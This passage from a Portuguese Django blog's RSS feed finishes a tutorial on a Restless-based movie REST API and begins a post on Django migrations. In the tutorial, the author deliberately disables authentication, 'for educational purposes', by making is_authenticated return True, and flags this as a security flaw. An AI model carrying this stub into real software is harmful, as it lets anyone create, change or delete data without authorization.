         &amp;quot;description&amp;quot; : &amp;quot;The Rebel Alliance makes a risky move to steal the plans for the Death Star, setting up the epic saga to follow. (133 mins.)&amp;quot;,
         &amp;quot;id&amp;quot; : &amp;quot;7e383f9c-5dc4-4b0d-9864-71e05a5d271b&amp;quot;,
         &amp;quot;title&amp;quot; : &amp;quot;Rogue One&amp;quot;
      },
      (...)
   ]
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Criação e autorização&lt;/h2&gt;
&lt;p&gt;Para adicionar um filme, faremos um POST em &lt;code class=&quot;language-text&quot;&gt;movies/&lt;/code&gt;, para isso, precisamos adicionar um método &lt;code class=&quot;language-text&quot;&gt;create&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# movies/api.py&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;MovieResource&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DjangoResource&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; Movie&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token builtin&quot;&gt;all&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; Movie&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;create&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
            title&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;title&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            description&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;description&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mais uma vez o &lt;em&gt;Restless&lt;/em&gt; não introspecta o modelo, logo, é necessário fazer a validação e criação do objeto
em banco &quot;na mão&quot;.&lt;/p&gt;
&lt;p&gt;Vamos testar se o comportamento é o esperado:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl -X POST -H &amp;quot;Content-Type: application/json&amp;quot; -d &amp;#39;{&amp;quot;title&amp;quot;: &amp;quot;just a test&amp;quot;, &amp;quot;description&amp;quot;: &amp;quot;foo bar&amp;quot;}&amp;#39; http://localhost:8000/movies/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Provavelmente retornará um &lt;em&gt;exception&lt;/em&gt; dizendo que o acesso não foi autorizado. O &lt;em&gt;Restless&lt;/em&gt; por padrão espera
que todo o &lt;code class=&quot;language-text&quot;&gt;POST&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;PUT&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;DELETE&lt;/code&gt; seja realizado através de uma requisição autenticada. Para isso, antes
de executar cada verbo, ele consulta o método &lt;code class=&quot;language-text&quot;&gt;is_authenticated&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;figure class=&quot;gatsby-resp-image-figure&quot; style=&quot;&quot;&gt;
    &lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto;  max-width: 600px;&quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/4e027daa42357f668194d325afbcf154/b4294/deathstar.jpg&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 52.60416666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAALABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAABQADBP/EABYBAQEBAAAAAAAAAAAAAAAAAAIBA//aAAwDAQACEAMQAAABL7ydaX4mWf8A/8QAGxAAAgIDAQAAAAAAAAAAAAAAAQIAEQMSEyH/2gAIAQEAAQUCxlL6rS+gRZsZ/8QAFhEAAwAAAAAAAAAAAAAAAAAAAhAx/9oACAEDAQE/ASi//8QAFREBAQAAAAAAAAAAAAAAAAAAARD/2gAIAQIBAT8BJ//EABsQAAICAwEAAAAAAAAAAAAAAAABAhEQISIx/9oACAEBAAY/AulYow0i8+n/xAAaEAEBAAIDAAAAAAAAAAAAAAABABExIUFR/9oACAEBAAE/ISc8RjD0mMnbbXdkdK//2gAMAwEAAgADAAAAEBQv/8QAFhEBAQEAAAAAAAAAAAAAAAAAAAEx/9oACAEDAQE/ENEj/8QAFREBAQAAAAAAAAAAAAAAAAAAEDH/2gAIAQIBAT8Qo//EABoQAQADAQEBAAAAAAAAAAAAAAEAESExQWH/2gAIAQEAAT8QZPJAefYb2oA7Kklzp2LRMUdlQAAMGf/Z&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;&amp;quot;is_authenticated retornando True é pior que o problema de segurança na Estrela da Morte (movieweb.com)&amp;quot;&quot;
        title=&quot;is_authenticated retornando True é pior que o problema de segurança na Estrela da Morte (movieweb.com)&quot;
        src=&quot;/static/4e027daa42357f668194d325afbcf154/b4294/deathstar.jpg&quot;
        srcset=&quot;/static/4e027daa42357f668194d325afbcf154/7809d/deathstar.jpg 192w,
/static/4e027daa42357f668194d325afbcf154/4ecad/deathstar.jpg 384w,
/static/4e027daa42357f668194d325afbcf154/b4294/deathstar.jpg 600w&quot;
        sizes=&quot;(max-width: 600px) 100vw, 600px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;
    &lt;figcaption class=&quot;gatsby-resp-image-figcaption&quot;&gt;is_authenticated retornando True é pior que o problema de segurança na Estrela da Morte (movieweb.com)&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Para fins educacionais, vamos informar à biblioteca que todas as requisições são aceitas:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# movies/api.py&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;MovieResource&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DjangoResource&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;create&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; Movie&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;objects&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;create&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;
            title&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;title&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
            description&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;description&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;is_authenticated&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Mais uma vez executamos o &lt;em&gt;POST&lt;/em&gt; via &lt;code class=&quot;language-text&quot;&gt;curl&lt;/code&gt;, e &lt;em&gt;voilà&lt;/em&gt;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;json&quot;&gt;&lt;pre class=&quot;language-json&quot;&gt;&lt;code class=&quot;language-json&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;title&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;just a test&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;bd02d0eb-4b75-4bfe-8222-ba24f7a1cad4&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;token property&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;foo bar&quot;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Verbos por ID&lt;/h2&gt;
&lt;p&gt;Já listamos e criamos novos filmes. Como fazemos para ver os detalhes de um filme através do
seu &lt;em&gt;ID&lt;/em&gt;? Simples! O método &lt;code class=&quot;language-text&quot;&gt;detail&lt;/code&gt; resolve essa para a gente:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# movies/api.py&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; django&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;shortcuts &lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; get_object_or_404

&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;MovieResource&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DjangoResource&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;detail&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; get_object_or_404&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Movie&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pk&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;pk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Um &lt;code class=&quot;language-text&quot;&gt;GET&lt;/code&gt; para &lt;code class=&quot;language-text&quot;&gt;movies/{id}&lt;/code&gt; retornará os detalhes do recurso:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl -X GET http://localhost:8000/movies/7e383f9c-5dc4-4b0d-9864-71e05a5d271b/

{
  &amp;quot;description&amp;quot;: &amp;quot;The Rebel Alliance makes a risky move to steal the plans for the Death Star, setting up the epic saga to follow. (133 mins.)&amp;quot;,
  &amp;quot;id&amp;quot;: &amp;quot;7e383f9c-5dc4-4b0d-9864-71e05a5d271b&amp;quot;,
  &amp;quot;title&amp;quot;: &amp;quot;Rogue One&amp;quot;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note que o &lt;code class=&quot;language-text&quot;&gt;DjangoResource&lt;/code&gt; resolveu a passagem do parâmetro &lt;code class=&quot;language-text&quot;&gt;pk&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Para finalizar, vamos criar os métodos &lt;code class=&quot;language-text&quot;&gt;update&lt;/code&gt; e &lt;code class=&quot;language-text&quot;&gt;delete&lt;/code&gt;, que serão responsáveis
por atualizar e remover o recurso:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;python&quot;&gt;&lt;pre class=&quot;language-python&quot;&gt;&lt;code class=&quot;language-python&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# movies/api.py&lt;/span&gt;

&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;


&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;MovieResource&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;DjangoResource&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;

    &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;detail&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; get_object_or_404&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;Movie&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pk&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;pk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        movie &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;detail&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

        movie&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;title &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;title&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
        movie&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;description &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&apos;description&apos;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;
        movie&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;save&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; movie

    &lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;delete&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;self&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; pk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
        movie &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; self&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;detail&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pk&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
        movie&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;delete&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Assim como o método &lt;code class=&quot;language-text&quot;&gt;create&lt;/code&gt;, não há nenhuma &quot;mágica&quot; resolvendo a operação para a gente.
Precisamos explicitamente realizar a atualização e remoção do dado através do &lt;em&gt;ORM&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Agora somos capazes de atualizar:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ curl -X PUT -H &amp;quot;Content-Type: application/json&amp;quot; -d &amp;#39;{&amp;quot;title&amp;quot;: &amp;quot;Zombieland&amp;quot;, &amp;quot;description&amp;quot;: &amp;quot;So much fun&amp;quot;}&amp;#39; http://localhost:8000/movies/bd02d0eb-4b75-4bfe-8222-ba24f7a1cad4/

{
  &amp;quot;title&amp;quot;: &amp;quot;Zombieland&amp;quot;,
  &amp;quot;description&amp;quot;: &amp;quot;So much fun&amp;quot;,
  &amp;quot;id&amp;quot;: &amp;quot;bd02d0eb-4b75-4bfe-8222-ba24f7a1cad4&amp;quot;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;E remover um filme através da API:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;curl -X DELETE http://localhost:8000/movies/bd02d0eb-4b75-4bfe-8222-ba24f7a1cad4/&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Gosto bastante do &lt;em&gt;Restless&lt;/em&gt; pela sua filosofia de manter-se simples. Mas nem tudo são rosas!
A falta de autorização, &lt;em&gt;HATEOAS&lt;/em&gt; e saídas em outros formatos (como &lt;em&gt;XML&lt;/em&gt;, por exemplo)
podem ser argumentos decisivos para a escolha de uma biblioteca mais completa.&lt;/p&gt;
&lt;p&gt;Eu costumo utilizar o &lt;em&gt;Restless&lt;/em&gt; em projetos muito específicos, onde sei que a &lt;em&gt;API&lt;/em&gt; será sempre
&lt;em&gt;JSON&lt;/em&gt;, e integrações com o &lt;em&gt;ORM&lt;/em&gt; trarão mais dores de cabeça do que soluções (em um cenário
onde há interação com bancos &lt;em&gt;NoSQL&lt;/em&gt;, o &lt;em&gt;Restless&lt;/em&gt; se mostra uma ferramenta muito útil).&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/kplaube/post-django-restless&quot; title=&quot;Veja o exemplo completo no Github&quot;&gt;Confira o exemplo desse &lt;em&gt;post&lt;/em&gt; no Github&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[As built-in migrations do Django]]></title><description><![CDATA[Quem usa o Django há mais tempo já ouviu
falar do South. Famosa biblioteca
responsável por trazer o comportamento de migrations
para o Django. Sem dúvida impactou inúmeros projetos e transformou o processo de
deploy de toda a comunidade envolvida com o framework. Nas versões mais recentes do Django…]]></description><link>https://klauslaube.com.br/2016/10/18/as-built-in-migrations-do-django.html</link><guid isPermaLink="false">https://klauslaube.com.br/2016/10/18/as-built-in-migrations-do-django.html</guid><dc:creator><![CDATA[Klaus Peter Laube]]></dc:creator><pubDate>Tue, 18 Oct 2016 12:43:00 GMT</pubDate><content:encoded>&lt;p&gt;Quem usa o &lt;a href=&quot;/tag/django.html&quot; title=&quot;Leia mais sobre Django&quot;&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt; há mais tempo já ouviu
falar do &lt;a href=&quot;/tag/south.html&quot; title=&quot;Leia mais sobre South&quot;&gt;&lt;em&gt;South&lt;/em&gt;&lt;/a&gt;. Famosa biblioteca
responsável por trazer o comportamento de &lt;a href=&quot;/tag/migrations.html&quot; title=&quot;Leia mais sobre Migrations&quot;&gt;&lt;em&gt;migrations&lt;/em&gt;&lt;/a&gt;
para o &lt;em&gt;Django&lt;/em&gt;. Sem dúvida impactou inúmeros projetos e transformou o processo de
&lt;em&gt;deploy&lt;/em&gt; de toda a comunidade envolvida com o &lt;em&gt;framework&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Nas versões mais recentes do &lt;em&gt;Django&lt;/em&gt;, contamos com um &lt;em&gt;engine&lt;/em&gt; &lt;em&gt;built-in&lt;/em&gt;,
muito prático, e que traz alguns conceitos que ficaram famosos com o &lt;em&gt;South&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Vamos nessa dar adeus ao &lt;code class=&quot;language-text&quot;&gt;syncdb&lt;/code&gt;, e começar a nossa aventura com o &lt;code class=&quot;language-text&quot;&gt;migrate&lt;/code&gt;.&lt;/p&gt;
&lt;h2&gt;O que são migrations?&lt;/h2&gt;
&lt;p&gt;Diretamente da documentação do &lt;em&gt;South&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) são uma forma de alterar o schema do seu banco de dados de uma versão para outra.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Você mantém em seu projeto uma série de instruções que modificam o &lt;em&gt;database&lt;/em&gt;
de acordo com a evolução do projeto. Quando uma nova pessoa fizer parte do time,
não é necessário a realização de nenhum &quot;dump&quot; &lt;em&gt;SQL&lt;/em&gt;, apenas a execução dessas &lt;em&gt;migrations&lt;/em&gt;
é o suficiente para você ter o &lt;em&gt;db&lt;/em&gt; pronto para uso.&lt;/p&gt;
&lt;p&gt;Dentro do ecossistema &lt;em&gt;Django&lt;/em&gt;, as &lt;em&gt;built-in migrations&lt;/em&gt; vieram como uma excelente
contribuição ao projeto. A distribuição de &lt;em&gt;apps&lt;/em&gt; fica mais coerente, agora que o
desenvolvedor não precisa mais de uma &quot;segunda biblioteca&quot; para passar a usar
um app que estamos distribuindo.&lt;/p&gt;
&lt;h2&gt;Faça migrations&lt;/h2&gt;
&lt;p&gt;Para exemplificar como toda essa mágica funciona, vamos criar um &lt;em&gt;app&lt;/em&gt; chamado &quot;lista&lt;em&gt;de&lt;/em&gt;compras&quot;:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;$ python manage.py startapp lista_de_compras&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
